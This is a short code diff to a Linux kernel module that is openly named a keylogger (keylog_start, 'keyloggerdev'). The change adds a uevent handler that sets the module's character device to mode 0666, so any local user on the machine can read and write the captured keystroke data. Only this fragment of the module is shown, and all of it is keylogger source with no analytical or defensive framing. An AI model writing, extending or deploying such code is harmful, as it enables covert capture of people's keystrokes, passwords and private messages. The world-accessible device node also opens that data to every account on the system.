@@ -127,6 +127,12 @@ static int release(struct inode *inode, struct file *file){
     return 0;
 }
 
+static int userEvent(struct device *device, struct kobj_uevent_env *enviroment){
+    add_uevent_var(enviroment, "DEVMODE=%#o", 0666);
+    return 0;
+}
+
+
 static int __init keylog_start (void){
 
 	// vars
@@ -145,6 +151,7 @@ static int __init keylog_start (void){
 	major = MAJOR(device);
 
 	charDevClass = class_create(THIS_MODULE, "keyloggerdev");
+	charDevClass->dev_uevent = userEvent;
 
 	cdev_init(&deviceData[0].cdev, &operations);
 
